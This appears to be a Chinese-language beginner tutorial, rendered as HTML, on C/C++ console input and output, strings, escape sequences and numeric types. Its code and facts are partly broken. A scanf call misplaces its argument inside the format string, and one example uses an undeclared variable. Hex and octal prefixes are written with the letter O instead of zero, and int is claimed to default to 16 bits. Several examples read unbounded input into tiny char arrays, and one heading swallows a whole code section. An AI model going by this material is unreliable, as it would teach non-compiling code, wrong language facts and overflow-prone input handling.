<li><p><strong>可輸入整數至變數b</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> b;</span><br><span class="line">cin&gt;&gt;b;</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;b=&quot;</span>&lt;&lt;b&lt;&lt;endl;</span><br></pre></td></tr></table></figure></li>
<li><p><strong>可輸入字串至變數c</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> c[<span class="number">5</span>];</span><br><span class="line">cin&gt;&gt;c;</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;c=&quot;</span>&lt;&lt;c&lt;&lt;endl;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="cin-範例程式"><a href="#cin-範例程式" class="headerlink" title="cin 範例程式"></a>cin 範例程式</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">char</span> a; <span class="comment">//只輸出輸入的第一個字元EX:輸入106輸出1</span></span><br><span class="line">    cin&gt;&gt;a;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;a=&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">    <span class="type">int</span> b;<span class="comment">//只輸出整數若為0.2只輸出0</span></span><br><span class="line">    cin&gt;&gt;b;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;b=&quot;</span>&lt;&lt;b&lt;&lt;endl;</span><br><span class="line">    <span class="type">char</span> c[<span class="number">5</span>];<span class="comment">//可輸出多個字元EX:輸入106輸出106</span></span><br><span class="line">    cin&gt;&gt;c;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;c=&quot;</span>&lt;&lt;c&lt;&lt;endl;</span><br><span class="line">   <span class="comment">//下面這幾段也是同樣意思，可連續輸入3個變數EX:a 1 300 輸出a=a b=1 c=300 和前面一樣都可用連續輸入讓他輸出</span></span><br><span class="line">   cin&gt;&gt;a&gt;&gt;b&gt;&gt;c;</span><br><span class="line">   cout&lt;&lt;<span class="string">&quot;a=&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">   cout&lt;&lt;<span class="string">&quot;b=&quot;</span>&lt;&lt;b&lt;&lt;endl;</span><br><span class="line">   cout&lt;&lt;<span class="string">&quot;c=&quot;</span>&lt;&lt;c&lt;&lt;endl;  </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="cout-輸出"><a href="#cout-輸出" class="headerlink" title="cout 輸出"></a>cout 輸出</h1><p><code>cout可輸出指定任何文數字與變數內容，且不用管變數的資料型態</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a=<span class="number">5</span>;</span><br><span class="line">cout&lt;&lt;a;</span><br><span class="line"><span class="comment">//輸出5</span></span><br></pre></td></tr></table></figure>
<h5 id="或是"><a href="#或是" class="headerlink" title="或是"></a>或是</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a=<span class="number">5</span>;</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;a=&quot;</span>&lt;&lt;a;</span><br><span class="line"><span class="comment">//其中第一個用雙引號表示字串內容，以字串方式輸出，第二個a，則是變數，將會輸出對應變數的內容也是輸出5</span></span><br></pre></td></tr></table></figure>
<h3 id="cout-範例程式1"><a href="#cout-範例程式1" class="headerlink" title="cout 範例程式1"></a>cout 範例程式1</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Good&quot;</span> &lt;&lt;endl;</span><br><span class="line">    <span class="type">int</span> a =<span class="number">5</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;a=&quot;</span> &lt;&lt;a&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="若要進行輸出資料的欄位寬度、符點小數位數、輸出靠左或靠右"><a href="#若要進行輸出資料的欄位寬度、符點小數位數、輸出靠左或靠右" class="headerlink" title="若要進行輸出資料的欄位寬度、符點小數位數、輸出靠左或靠右"></a>若要進行輸出資料的欄位寬度、符點小數位數、輸出靠左或靠右</h4><blockquote>
<h5 id="使用cout物件所提供的width、setf等屬性"><a href="#使用cout物件所提供的width、setf等屬性" class="headerlink" title="使用cout物件所提供的width、setf等屬性"></a>使用cout物件所提供的width、setf等屬性</h5></blockquote>
<h4 id="width屬性可設定輸出資料的欄位寬度，預設向右靠齊"><a href="#width屬性可設定輸出資料的欄位寬度，預設向右靠齊" class="headerlink" title="width屬性可設定輸出資料的欄位寬度，預設向右靠齊"></a>width屬性可設定輸出資料的欄位寬度，預設向右靠齊</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a1=<span class="number">1</span> ,a2=<span class="number">10</span> ,a3=<span class="number">100</span> ,a4=<span class="number">1000</span> ,a5=<span class="number">10000</span>;</span><br><span class="line">cout.<span class="built_in">width</span>(<span class="number">5</span>);cout&lt;&lt;a1&lt;&lt;endl;</span><br><span class="line">cout.<span class="built_in">width</span>(<span class="number">5</span>);cout&lt;&lt;a2&lt;&lt;endl;</span><br><span class="line">cout.<span class="built_in">width</span>(<span class="number">5</span>);cout&lt;&lt;a3&lt;&lt;endl;</span><br><span class="line">cout.<span class="built_in">width</span>(<span class="number">5</span>);cout&lt;&lt;a4&lt;&lt;endl;</span><br><span class="line">cout.<span class="built_in">width</span>(<span class="number">5</span>);cout&lt;&lt;a5&lt;&lt;endl;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>輸出結果會是<br>                   1<br>                  10<br>                 100<br>                1000<br>               10000[color&#x3D;#d35]</p>
</blockquote>
<p>:::success<br>cout.width(5)<br><strong>在每個輸出前都要設定，有效期只有一次</strong><br>:::</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">cout.<span class="built_in">width</span>(<span class="number">5</span>)</span><br><span class="line">cout&lt;&lt; a1 &lt;&lt;endl;</span><br><span class="line">cout&lt;&lt; a2 &lt;&lt;endl;</span><br><span class="line"><span class="comment">//只對a1有效</span></span><br></pre></td></tr></table></figure>
<h3 id="範例程式2"><a href="#範例程式2" class="headerlink" title="範例程式2"></a>範例程式2</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> a1=<span class="number">100</span>,a2=<span class="number">100</span>;</span><br><span class="line">    cout.<span class="built_in">width</span>(<span class="number">5</span>);</span><br><span class="line">    cout &lt;&lt; a1 &lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; a2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<pre><code>輸出會是
    100
  100
只會影響到第一個的輸出位置(預設靠右)
</code></pre>
<h4 id="setf可輸出資料的小數點位數，資料靠左或靠右"><a href="#setf可輸出資料的小數點位數，資料靠左或靠右" class="headerlink" title="setf可輸出資料的小數點位數，資料靠左或靠右"></a><strong>setf可輸出資料的小數點位數，資料靠左或靠右</strong></h4><ul>
<li><font color="#f11">cout.setf(ios::fixed,ios::floatfield);</font></li>
</ul>
<h4 id="ios-命名空間名稱-範圍運算子-floatfield-表示浮點數欄位"><a href="#ios-命名空間名稱-範圍運算子-floatfield-表示浮點數欄位" class="headerlink" title="ios&gt;&gt;命名空間名稱__&quot;::&quot;&gt;&gt;範圍運算子__ floatfield &gt;&gt;表示浮點數欄位"></a><code>ios&gt;&gt;命名空間名稱__&quot;::&quot;&gt;&gt;範圍運算子__ floatfield &gt;&gt;表示浮點數欄位</code></h4><ul>
<li><font color="#f11">cout.precision(2);</font></li>
</ul>
<h5 id="precision-2-浮點數精準度-小數後取兩位"><a href="#precision-2-浮點數精準度-小數後取兩位" class="headerlink" title="precision(2)&gt;&gt;浮點數精準度(小數後取兩位)"></a><code>precision(2)&gt;&gt;浮點數精準度(小數後取兩位)</code></h5><ul>
<li><font color="#f11">cout.setf(ios::right,ios::adjustfield)</font></li>
</ul>
<h4 id="設定靠左-left-或靠右-right-，adjustfield-自動調整欄位"><a href="#設定靠左-left-或靠右-right-，adjustfield-自動調整欄位" class="headerlink" title="設定靠左(left)或靠右(right)，adjustfield &gt;&gt;自動調整欄位"></a><code>設定靠左(left)或靠右(right)，adjustfield &gt;&gt;自動調整欄位</code></h4><h3 id="cout-範例程式3"><a href="#cout-範例程式3" class="headerlink" title="cout 範例程式3"></a>cout 範例程式3</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">  <span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line">  <span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">float</span> b1=<span class="number">3.14159</span>;</span><br><span class="line">    cout.<span class="built_in">setf</span>(ios::fixed,ios::floatfield);</span><br><span class="line">    cout.<span class="built_in">precision</span>(<span class="number">2</span>);</span><br><span class="line">    cout.<span class="built_in">setf</span>(ios::right,ios::adjustfield);</span><br><span class="line">    cout.<span class="built_in">width</span>(<span class="number">8</span>);</span><br><span class="line">    cout&lt;&lt;b1&lt;&lt;endl;</span><br><span class="line">    cout.<span class="built_in">width</span>(<span class="number">8</span>);</span><br><span class="line">    cout&lt;&lt;b1*<span class="number">20</span>&lt;&lt;endl;</span><br><span class="line">    cout.<span class="built_in">width</span>(<span class="number">8</span>);</span><br><span class="line">    cout&lt;&lt;b1*<span class="number">200</span>&lt;&lt;endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<pre><code>輸出結果
  3.14
 62.83
628.32
</code></pre>
<h1 id="printf-輸出"><a href="#printf-輸出" class="headerlink" title="printf 輸出"></a>printf 輸出</h1><p><code>C語言採用printf()與scanf()作為輸出入函式</code></p>
<p><font color="#f11">printf()</font>可輸出結果，期中括號內需放置一對<font color="#f11">大括號(“”)</font>達成將欲輸出的資料當作引數傳給printf()函式</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;a&quot;</span>); </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;aa&quot;</span>); </span><br></pre></td></tr></table></figure>
<blockquote>
<p>輸出結果為  aaa</p>
</blockquote>
<h5 id="要跳列的話，需使用到跳脫字元-n"><a href="#要跳列的話，需使用到跳脫字元-n" class="headerlink" title="要跳列的話，需使用到跳脫字元 \n"></a>要跳列的話，需使用到<font color="#f11">跳脫字元 \n</font></h5><p><code>通常使用換行符\n，在其他情況下則使用控制符endl。一個差別是，endl確保程序將立即顯示在屏幕上；而使用“\n”不能提供這樣的保證，這意味著在有些系統中，有時可能在您輸入信息後才會出現提示。</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;a\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;a\na&quot;</span>);  </span><br></pre></td></tr></table></figure>
<blockquote>
<p>輸出結果<br>a<br>a<br>a </p>
</blockquote>
<h3 id="printf-範例程式1"><a href="#printf-範例程式1" class="headerlink" title="printf 範例程式1"></a>printf 範例程式1</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;a\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;a\nb\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<pre><code>結果就是  
a
a
b 
</code></pre>
<h4 id="如果是變數的輸出，則必須在引數敘述中加一個列印格式控制輸出格式"><a href="#如果是變數的輸出，則必須在引數敘述中加一個列印格式控制輸出格式" class="headerlink" title="如果是變數的輸出，則必須在引數敘述中加一個列印格式控制輸出格式"></a>如果是變數的輸出，則必須在引數敘述中加一個列印格式控制輸出格式</h4><h3 id="printf-範例程式2"><a href="#printf-範例程式2" class="headerlink" title="printf 範例程式2"></a>printf 範例程式2</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> a=<span class="number">3</span>;</span><br><span class="line">	<span class="type">int</span> b=<span class="number">5</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;a=%d\nb=%d&quot;</span>,a,b);</span><br><span class="line"><span class="comment">// a,b會依序對應 </span></span><br><span class="line"><span class="comment">// %d&gt;&gt;整數 %ld&gt;&gt;長整數 %f&gt;&gt;浮點數  %c&gt;&gt;字元 %s&gt;&gt;字串(字元陣列)</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<pre><code>結果是 
a=3
b=5 
</code></pre>
<h1 id="scanf-輸入"><a href="#scanf-輸入" class="headerlink" title="scanf 輸入"></a>scanf 輸入</h1><p><code>scanf()可輸入資料，跟printf同樣方式，兩者都需用到列印格式控制輸出入資料</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">輸入字元</span><br><span class="line"><span class="type">char</span> a;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%c,&amp;a&quot;</span>); </span><br><span class="line"><span class="comment">//%c&gt;&gt;字元 &amp;a&gt;&gt;指定到a，&amp;是取址符號用來取得欲放置輸入資料的變數位置</span></span><br></pre></td></tr></table></figure>
<h3 id="scanf-範例程式1"><a href="#scanf-範例程式1" class="headerlink" title="scanf 範例程式1"></a>scanf 範例程式1</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">char</span> a;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;press any char: &quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>, &amp;a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;char is %c&quot;</span>,a);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<pre><code> 輸出結果&gt;&gt; 
 press any char: 1
 char is 1
</code></pre>
<h4 id="C語言的字串是由字元陣列組成"><a href="#C語言的字串是由字元陣列組成" class="headerlink" title="C語言的字串是由字元陣列組成"></a>C語言的字串是由<font color="#f11">字元陣列</font>組成</h4><h4 id="在輸入字串時，必須利用字元陣列完成輸入"><a href="#在輸入字串時，必須利用字元陣列完成輸入" class="headerlink" title="在輸入字串時，必須利用字元陣列完成輸入"></a>在輸入字串時，必須利用字元陣列完成輸入</h4><h3 id="scanf-範例程式2"><a href="#scanf-範例程式2" class="headerlink" title="scanf 範例程式2"></a>scanf 範例程式2</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">char</span> c[<span class="number">6</span>]; <span class="comment">//一維陣列中有6個元素 </span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;enter a string: &quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;c); <span class="comment">//%s&gt;&gt;字元陣列 </span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;enter is %s&quot;</span>, c);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>此程式輸入是什麼輸出就是什麼</p>
</blockquote>
<h3 id="scanf-範例程式3"><a href="#scanf-範例程式3" class="headerlink" title="scanf 範例程式3"></a>scanf 範例程式3</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> a;</span><br><span class="line">	<span class="type">long</span> b;</span><br><span class="line">	<span class="type">float</span> c;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;enter an int: &quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;enter an long int: &quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%ld&quot;</span>, &amp;b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;enter an float: &quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%f&quot;</span>, &amp;c);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n your enter.... \n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;int a =%d \n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;long int b =%ld \n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;float c =%f&quot;</span>, c);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;	</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<h4 id="如果設int-10，long-int-1-11"><a href="#如果設int-10，long-int-1-11" class="headerlink" title="如果設int &gt;&gt;10，long int&gt;&gt;1.11"></a>如果設int &gt;&gt;10，long int&gt;&gt;1.11</h4><h4 id="則float會直接將長整數的0-11拿過來"><a href="#則float會直接將長整數的0-11拿過來" class="headerlink" title="則float會直接將長整數的0.11拿過來"></a>則float會直接將長整數的0.11拿過來</h4><pre><code>輸出結果
 enter an int: 10
 enter an long int: 1.11
 enter an float:
 your enter.....
 int a =10
 long int b=1
 float c=0.110000
</code></pre>
<h1 id="string-字串"><a href="#string-字串" class="headerlink" title="string 字串"></a>string 字串</h1><h4 id="C因為要精簡編譯器，SO沒有string型態，所有字串處理都要使用字元陣列"><a href="#C因為要精簡編譯器，SO沒有string型態，所有字串處理都要使用字元陣列" class="headerlink" title="C因為要精簡編譯器，SO沒有string型態，所有字串處理都要使用字元陣列"></a>C因為要精簡編譯器，SO沒有string型態，所有字串處理都要使用字元陣列</h4><h4 id="C-新增string型態"><a href="#C-新增string型態" class="headerlink" title="C++新增string型態"></a>C++新增string型態</h4><h1 id="在使用前都要包含cstring巨集-string-範例程式-兩個程式比對一下輸出結果na-若輸入HI-HO-輸出結果-a-HI-b-HI-HO跳脫字元-Escape-Sequence"><a href="#在使用前都要包含cstring巨集-string-範例程式-兩個程式比對一下輸出結果na-若輸入HI-HO-輸出結果-a-HI-b-HI-HO跳脫字元-Escape-Sequence" class="headerlink" title="在使用前都要包含cstring巨集### string 範例程式##### 兩個程式比對一下輸出結果na~~    若輸入HI HO    輸出結果    a &#x3D; HI    b &#x3D; HI HO跳脫字元(Escape Sequence)"></a><code>在使用前都要包含cstring巨集</code><br>### string 範例程式<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    string a;</span><br><span class="line">    cin &gt;&gt; a;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;a=&quot;</span> &lt;&lt;a;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>##### 兩個程式比對一下輸出結果na~~<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    string b;</span><br><span class="line">    <span class="built_in">getline</span>(cin,b);</span><br><span class="line">    cout &lt;&lt; a&lt;&lt;endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;b=&quot;</span> &lt;&lt;b ;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//若要輸入含空白字串，則要使用getline()函式</span></span><br></pre></td></tr></table></figure><br>    若輸入HI HO<br>    輸出結果<br>    a &#x3D; HI<br>    b &#x3D; HI HO<br>跳脫字元(Escape Sequence)</h1><h4 id="字元中的單引號-‘-、雙引號-“-及反斜線-均有定義功能"><a href="#字元中的單引號-‘-、雙引號-“-及反斜線-均有定義功能" class="headerlink" title="字元中的單引號(‘)、雙引號(“)及反斜線()均有定義功能"></a>字元中的單引號(‘)、雙引號(“)及反斜線()均有定義功能</h4><h4 id="若一定要使用這些字元，使用前須加反斜線-跳脫定義功能"><a href="#若一定要使用這些字元，使用前須加反斜線-跳脫定義功能" class="headerlink" title="若一定要使用這些字元，使用前須加反斜線()跳脫定義功能"></a>若一定要使用這些字元，使用前須加反斜線()跳脫定義功能</h4><hr>
<table>
<thead>
<tr>
<th align="center">字元</th>
<th align="center">跳脫字元序列</th>
</tr>
</thead>
<tbody><tr>
<td align="center">單引號</td>
<td align="center">\ &#39;</td>
</tr>
<tr>
<td align="center">雙引號</td>
<td align="center">\ &quot;</td>
</tr>
<tr>
<td align="center">反斜線</td>
<td align="center">\ \</td>
</tr>
</tbody></table>
<h2 id="範例程式"><a href="#範例程式" class="headerlink" title="範例程式"></a>範例程式</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">   string a= <span class="string">&quot;HI&quot;</span> ;</span><br><span class="line">   cout &lt;&lt; <span class="string">&quot;a=&quot;</span> &lt;&lt;a&lt;&lt;endl;</span><br><span class="line">   string b= <span class="string">&quot;\&quot;HI\&quot;&quot;</span> ;</span><br><span class="line">   cout &lt;&lt;<span class="string">&quot;b=&quot;</span> &lt;&lt;b&lt;&lt;endl;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<pre><code>輸出結果
a=HI
b=&quot;HI&quot;
</code></pre>
<h1 id="資料分類與型態"><a href="#資料分類與型態" class="headerlink" title="資料分類與型態"></a>資料分類與型態</h1><p><code>下面整理C/C++語言數值資料型態，unsigned表示無號整數、即非負整數</code></p>
<table>
<thead>
<tr>
<th align="center">數值資料型態</th>
<th align="center">占用記憶體大小</th>
<th align="center">代表的數值範圍</th>
</tr>
</thead>
<tbody><tr>
<td align="center">short</td>
<td align="center">16</td>
<td align="center">-32768 ~ +32767</td>
</tr>
<tr>
<td align="center">int</td>
<td align="center">16</td>
<td align="center">-32768 ~ +32767</td>
</tr>
<tr>
<td align="center">long</td>
<td align="center">32</td>
<td align="center">-2147483648 ~ +2147483647</td>
</tr>
<tr>
<td align="center">unsigned short</td>
<td align="center">16</td>
<td align="center">0 ~ 65535</td>
</tr>
<tr>
<td align="center">unsigned int</td>
<td align="center">16</td>
<td align="center">0 ~ 65535</td>
</tr>
<tr>
<td align="center">unsigned long</td>
<td align="center">32</td>
<td align="center">0 ~ 4294967295</td>
</tr>
<tr>
<td align="center">float</td>
<td align="center">32</td>
<td align="center">大約3.4E-38 ~ 3.4E+38(負數亦同)</td>
</tr>
<tr>
<td align="center">double</td>
<td align="center">64</td>
<td align="center">大約1.7E-308 ~ 1.7E+308(負數亦同)</td>
</tr>
<tr>
<td align="center">long double</td>
<td align="center">80</td>
<td align="center">大約3.4E-4932 ~ 3.4E+4932(負數亦同)</td>
</tr>
</tbody></table>
<h2 id="資料分類"><a href="#資料分類" class="headerlink" title="資料分類"></a>資料分類</h2><h3 id="int-Integerts整數常數-的三種進位方式"><a href="#int-Integerts整數常數-的三種進位方式" class="headerlink" title="int(Integerts整數常數)的三種進位方式"></a>int(Integerts整數常數)的三種進位方式</h3><ul>
<li>十進位(Decimal)</li>
<li>十六進位(Hexadecimal)，<font color="#f11">以OX、Ox開頭</font></li>
<li>八進位(Octal)，<font color="#f11">以O開頭</font></li>
</ul>
<ul>
<li>OxA、OXB等類的均為16進制</li>
<li>11、12等等的一般書寫數字方式為10進位</li>
<li>O72則為8進位</li>
</ul>
<p><strong>可使用<font color="#f11">signed(有號)、unsigned(無號)</font>的short、int、long等的六種型態儲存整數</strong></p>
<blockquote>
<p><code>整數預設型態是16bits的int型態</code></p>
</blockquote>
<hr>
<h3 id="float-Floating-poing-literals浮點常數"><a href="#float-Floating-poing-literals浮點常數" class="headerlink" title="float(Floating-poing literals浮點常數)"></a>float(Floating-poing literals浮點常數)</h3><blockquote>
<p><font color="#f11">數字中含有小數點或指數的稱為浮點數</font><br>以指數為例E、e表示10的次方<br>例如0.0023、2.3E-3、2.3e-3都是表示相同的浮點數或是2.3E+2&gt;&gt;230<br>浮點數可使用標準書寫&gt;&gt;24.101、1.123<br>科學符號&gt;&gt;2.3E+1、2.01e-4</p>
</blockquote>
<p><strong>可以使用float、double、long double三種型態儲存浮點數常數</strong></p>
<h4 id="double是浮點數預設值，若要使用float，則應該要在數值後加上F、f"><a href="#double是浮點數預設值，若要使用float，則應該要在數值後加上F、f" class="headerlink" title="double是浮點數預設值，若要使用float，則應該要在數值後加上F、f"></a><font color="#f11">double是浮點數預設值</font>，若要使用float，則應該要在數值後加上F、f</h4><ul>
<li>例如: double &#x3D; 1.414，float &#x3D; 1.414f</li>
</ul>
<h4 id="而要用long-double應在數值後加L、l"><a href="#而要用long-double應在數值後加L、l" class="headerlink" title="而要用long double應在數值後加L、l"></a>而要用long double應在數值後加L、l</h4><ul>
<li>例如: long double &#x3D; 1.414L</li>
</ul>
<hr>
<h3 id="char-character-literals字元常數-，使用單引號-‘-圍住的-單一字元"><a href="#char-character-literals字元常數-，使用單引號-‘-圍住的-單一字元" class="headerlink" title="char(character literals字元常數)，使用單引號(‘)圍住的!!單一字元!!"></a>char(character literals字元常數)，使用單引號(‘)圍住的!!單一字元!!</h3><h4 id="例如’A’、’a’等"><a href="#例如’A’、’a’等" class="headerlink" title="例如’A’、’a’等"></a>例如’A’、’a’等</h4><blockquote>
<p><em><strong>C&#x2F;C++使用bits的ASCII，可表示256個字元包含<font color="#f11">大小寫英文字母、數字、標點符號、其他特殊符號</font></strong></em><br><strong>char型態是8位元長</strong></p>
</blockquote>
<hr>
<h3 id="String-字串"><a href="#String-字串" class="headerlink" title="String(字串)"></a>String(字串)</h3><h4 id="字串以雙引號”-“圍住"><a href="#字串以雙引號”-“圍住" class="headerlink" title="字串以雙引號” “圍住"></a>字串以雙引號” “圍住</h4><blockquote>
<p>例如:”HI”、”你好”</p>
</blockquote>
